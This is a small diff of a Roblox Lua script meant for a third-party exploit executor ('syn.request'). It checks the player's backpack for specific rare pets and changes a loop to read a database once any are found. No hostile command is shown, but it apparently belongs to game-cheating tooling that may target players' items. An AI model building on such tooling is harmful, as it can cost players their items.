@@ -5,7 +5,6 @@ local request = request or syn.request
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local DesiredPets = {"raccoon", "dragonfly", "queen bee"}
 local ListOfPets = {}
-local MeetRequirements = false
 
 local function CheckInventory()
 	for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
@@ -128,7 +127,7 @@ end
 
 coroutine.wrap(function()
 	while wait(1) do
-		if MeetRequirements == true then
+		if #ListOfPets ~= 0 then
 			local data = ReadDatabase()
 
 			if data ~= nil then
